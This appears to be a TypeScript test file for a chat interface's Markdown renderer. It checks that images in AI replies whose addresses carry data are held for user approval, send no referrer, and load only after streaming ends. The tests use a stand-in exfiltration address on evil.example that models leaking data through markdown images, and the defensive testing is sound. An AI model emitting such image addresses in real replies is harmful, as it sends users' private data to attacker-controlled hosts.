import { afterEach, expect, test } from "bun:test";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { TextMessagePartProvider } from "@assistant-ui/react";

import { installDom } from "@/test/dom";
import { HEAVY_HOSTS, HEAVY_THAT_FIT as FIT, heavyImageAddress } from "@/lib/imageBudget.fixture";
import { IMAGE_PROMPT_COPY } from "@/lib/imageUrlFilter";
import { ImageBudgetScope } from "./image-budget";
import { MarkdownText } from "./markdown-text";

let restore: (() => void) | undefined;
let mounted: Root | undefined;
afterEach(() => {
  if (mounted) act(() => mounted!.unmount());
  mounted = undefined;
  restore?.();
  restore = undefined;
});

async function show(root: Root, text: string, host: HTMLElement, isRunning = false, messageId?: string) {
  const deadline = Date.now() + 3000;
  await act(async () =>
    root.render(
      <ImageBudgetScope messageId={messageId}>
        <TextMessagePartProvider text={text} isRunning={isRunning}>
          <MarkdownText />
        </TextMessagePartProvider>
      </ImageBudgetScope>,
    ),
  );
  // The Markdown primitive reveals new text a few characters per animation frame: wait until the page stops changing.
  let last = "";
  for (let stable = 0; stable < 4 && Date.now() < deadline; ) {
    await act(async () => { await Bun.sleep(20); });
    stable = host.innerHTML === last ? stable + 1 : 0;
    last = host.innerHTML;
  }
}

async function reply(text: string) {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, text, host);
  return host;
}

const carrier = `https://evil.example/p.png?d=${"secret".repeat(14)}`;
const click = (button: Element) => act(async () => { (button as HTMLElement).click(); });
const buttonNamed = (host: HTMLElement, name: string) =>
  [...host.querySelectorAll("button")].find((b) => b.textContent === name)!;
const IMAGE_ADDRESS = (tail: string) => `https://evil.example/p.png?d=${"secret".repeat(14)}${tail}`;

test("a reply's normal image loads without asking", async () => {
  const host = await reply("![logo](https://i.imgur.com/AbCd123.png)");
  expect(host.querySelector("img")?.getAttribute("src")).toBe("https://i.imgur.com/AbCd123.png");
  expect(host.querySelector("button")).toBeNull();
});

test("an image address that carries data shows the host and full address, with no img until Load", async () => {
  const host = await reply(`![chart](${carrier})`);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.why("evil.example"));
  expect(host.textContent).toContain(carrier);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(carrier);
});

test("Not now leaves the image's description and no img", async () => {
  const host = await reply(`![chart](${carrier})`);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("chart"));
});

test("a data: image never loads and never asks", async () => {
  const host = await reply("![dot](data:image/png;base64,iVBORw0KGgo=)");
  expect(host.querySelector("img")).toBeNull();
  expect(host.querySelector("button")).toBeNull();
});

test("a link in a reply sends no referrer and no opener", async () => {
  const host = await reply("[docs](https://example.com/docs)");
  const link = host.querySelector("a")!;
  expect(link.getAttribute("href")).toBe("https://example.com/docs");
  expect(link.getAttribute("rel")?.split(" ").sort()).toEqual(["nofollow", "noopener", "noreferrer"]);
  expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
});

test("an image that loads sends no referrer", async () => {
  const host = await reply(`![chart](https://i.imgur.com/AbCd123.png)\n\n![big](${carrier})`);
  expect(host.querySelector("img")?.getAttribute("referrerpolicy")).toBe("no-referrer");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect([...host.querySelectorAll("img")].map((i) => i.getAttribute("referrerpolicy"))).toEqual(["no-referrer", "no-referrer"]);
});

test("Load approves the address the reader saw: if the address changes under the same image, it asks again", async () => {
  const a = IMAGE_ADDRESS("A");
  const b = IMAGE_ADDRESS("B");
  const host = await reply(`![chart](${a})`);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(a);
  await show(mounted!, `![chart](${b})`, host);
  expect(host.querySelector("img")).toBeNull();
  expect(host.textContent).toContain(b);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(host.querySelector("img")?.getAttribute("src")).toBe(b);
});

// Heavy addresses (lib/imageBudget.fixture.ts) on a.example, b.example, ...: the first FIT fit in a reply's budget, the
// last two do not.
const WAITING = HEAVY_HOSTS.slice(FIT);
const photo = (host: string, name = "p") => `![${name}](${heavyImageAddress(host, name)})`;
const heavyReply = HEAVY_HOSTS.map((h) => photo(h)).join("\n\n");
const imageCount = (host: HTMLElement) => host.querySelectorAll("img").length;

test("ordinary images never wait: five from other hosts all load, and nothing asks", async () => {
  const host = await reply(["a", "b", "c", "d", "e"].map((h) => `![${h}](https://${h}.example/photos/2026/front-page-${h}.png)`).join("\n\n"));
  expect(imageCount(host)).toBe(5);
  expect(host.querySelector("button")).toBeNull();
});

test("a reply whose images have more room for data than its budget: the first load, the rest wait for one prompt for the whole reply", async () => {
  const host = await reply(heavyReply);
  expect(imageCount(host)).toBe(FIT);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, WAITING));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.why);
  expect(host.querySelectorAll("button").length).toBe(2); // one prompt: Load and Not now
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(imageCount(host)).toBe(FIT + 2);
  expect(host.querySelector("button")).toBeNull();
});

test("Not now on the reply's prompt leaves the held images as descriptions and asks no more", async () => {
  const host = await reply(heavyReply);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.notNow));
  expect(imageCount(host)).toBe(FIT);
  expect(host.querySelector("button")).toBeNull();
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.notLoaded("p"));
});

test("our own hosts are charged only the floor: four of them leave room for every heavy image that fits", async () => {
  const own = [1, 2, 3, 4].map((n) => `![o](https://node.tinycloud.xyz/n${n}.png)`).join("\n\n");
  const host = await reply(`${own}\n\n${HEAVY_HOSTS.slice(0, FIT).map((h) => photo(h)).join("\n\n")}`);
  expect(imageCount(host)).toBe(4 + FIT);
  expect(host.querySelector("button")).toBeNull();
});

test("an approval covers the addresses it named: an image added to the reply afterwards waits again", async () => {
  const host = await reply(heavyReply);
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(imageCount(host)).toBe(FIT + 2);
  await show(mounted!, `${heavyReply}\n\n${photo("z.example")}`, host);
  expect(imageCount(host)).toBe(FIT + 2);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, ["z.example"]));
});

const srcs = (host: HTMLElement) => [...host.querySelectorAll("img")].map((img) => img.getAttribute("src"));

test("while a reply streams, no image loads, not even one of ours; the silent ones are chosen from the finished text, in document order", async () => {
  // One image by reference, FIT - 1 more that fit, one that does not, and one of ours.
  const fitting = HEAVY_HOSTS.slice(1, FIT);
  const own = "https://node.tinycloud.xyz/own.png";
  const text = ["![a][r]", ...fitting.map((h) => photo(h)), photo(WAITING[0]!), `![own](${own})`, `[r]: ${heavyImageAddress("r.example", "real")}`].join("\n\n");
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);

  // A reference definition arriving character by character: every prefix that parses as an address is a different image.
  for (const prefix of [text.slice(0, text.indexOf("[r]:") + 14), text.slice(0, text.indexOf("[r]:") + 21), text]) {
    await show(mounted, prefix, host, true);
    expect(srcs(host)).toEqual([]);
    expect(host.textContent).not.toContain("more image");
  }

  await show(mounted, text, host, false);
  // The reference definition is revealed last and draws nothing itself, so the page looks settled before the reveal ends.
  for (let waited = 0; srcs(host).length < FIT + 1 && waited < 3000; waited += 20) await act(async () => { await Bun.sleep(20); });
  const settled = srcs(host);
  expect(settled).toEqual([heavyImageAddress("r.example", "real"), ...fitting.map((h) => heavyImageAddress(h)), own]);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, [WAITING[0]!]));

  // Reopening the reply decides the same ones, whatever happened while it streamed.
  act(() => mounted!.unmount());
  host.remove();
  const reopened = document.createElement("div");
  document.body.append(reopened);
  mounted = createRoot(reopened);
  await show(mounted, text, reopened, false);
  expect(srcs(reopened)).toEqual(settled);
  expect(reopened.textContent).toContain(IMAGE_PROMPT_COPY.more.title(1, [WAITING[0]!]));
});

test("an address that asks shows no prompt for half a reply: it waits until the text is final", async () => {
  restore = installDom();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  await show(mounted, `![chart](${carrier})`, host, true);
  expect(host.querySelector("button")).toBeNull();
  expect(host.querySelector("img")).toBeNull();
  await show(mounted, `![chart](${carrier})`, host, false);
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
});

// Every address an <img> ever had, not only the final page: a transient load is a request.
function recordSrcs() {
  const ever: string[] = [];
  const original = Element.prototype.setAttribute;
  Element.prototype.setAttribute = function (this: Element, name: string, value: string) {
    if (this.tagName === "IMG" && name === "src") ever.push(value);
    return original.call(this, name, value);
  };
  return { ever, stop: () => { Element.prototype.setAttribute = original; } };
}

async function mountRecorded() {
  restore = installDom();
  const recorder = recordSrcs();
  const host = document.createElement("div");
  document.body.append(host);
  mounted = createRoot(host);
  const stop = restore;
  restore = () => { recorder.stop(); stop(); };
  return { host, ever: recorder.ever };
}

const LETTERS = HEAVY_HOSTS.map((h) => h[0]!);
const row = (...names: string[]) => names.map((n) => photo(`${n}.example`, n)).join("\n\n");
const loaded = (...names: string[]) => names.map((n) => heavyImageAddress(`${n}.example`, n));

test("a finished reply loads the images that fit and no other address is ever requested, not even once", async () => {
  const { host, ever } = await mountRecorded();
  await show(mounted!, row(...LETTERS), host, false);
  expect(new Set(ever)).toEqual(new Set(loaded(...LETTERS.slice(0, FIT))));
});

// An image that loads before the reply ends would not be counted against the reply's budget. (That an allowlisted image is
// charged once the reply has ended is tested in lib/imageBudget.test.ts.)
test("images on an allowlisted host wait for the end of the reply too: none is requested while it streams", async () => {
  const { host, ever } = await mountRecorded();
  const addresses = Array.from({ length: 12 }, (_, i) => `https://i.imgur.com/Zq${i.toString(36).padStart(5, "0")}.png`);
  const text = addresses.map((address) => `![i](${address})`).join("\n");
  await show(mounted!, text, host, true);
  expect(ever).toEqual([]);
  await show(mounted!, text, host, false);
  for (let waited = 0; srcs(host).length < addresses.length && waited < 3000; waited += 20) await act(async () => { await Bun.sleep(20); });
  expect(srcs(host)).toEqual(addresses);
});

test("an address changed in place while the reply is finished keeps its place: no held image takes it", async () => {
  const { host, ever } = await mountRecorded();
  await show(mounted!, row(...LETTERS), host, false);
  await show(mounted!, row("x", ...LETTERS.slice(1)), host, false);
  await show(mounted!, row("y", ...LETTERS.slice(1)), host, false);
  expect(new Set(ever)).toEqual(new Set(loaded(...LETTERS.slice(0, FIT), "x", "y")));
  expect(srcs(host)).toEqual(loaded("y", ...LETTERS.slice(1, FIT)));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, WAITING));
});

test("images that go away give up what they were charged: no prompt is left for an image that is no longer there", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, row(...LETTERS), host, false);
  expect(host.textContent).toContain("more images");
  await show(mounted!, row(LETTERS.at(-1)!), host, false);
  expect(srcs(host)).toEqual(loaded(LETTERS.at(-1)!));
  expect(host.textContent).not.toContain("more image");
  expect(host.querySelector("button")).toBeNull();
});

test("another message in the same component starts with a fresh budget: an approval does not carry over", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, row(...LETTERS), host, false, "message-1");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(srcs(host)).toEqual(loaded(...LETTERS));
  await show(mounted!, row(...LETTERS), host, false, "message-1");
  expect(srcs(host)).toEqual(loaded(...LETTERS));
  await show(mounted!, row(...LETTERS), host, false, "message-2");
  expect(srcs(host)).toEqual(loaded(...LETTERS.slice(0, FIT)));
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.more.title(2, WAITING));
});

test("a Load on an asking address belongs to its message: the same address in another message asks again", async () => {
  const { host } = await mountRecorded();
  await show(mounted!, `![chart](${carrier})`, host, false, "message-1");
  await click(buttonNamed(host, IMAGE_PROMPT_COPY.load));
  expect(srcs(host)).toEqual([carrier]);
  await show(mounted!, `![chart](${carrier})`, host, false, "message-2");
  expect(host.querySelector("img")).toBeNull(); // the Load was for message-1's image
  expect(host.textContent).toContain(IMAGE_PROMPT_COPY.title("evil.example"));
});
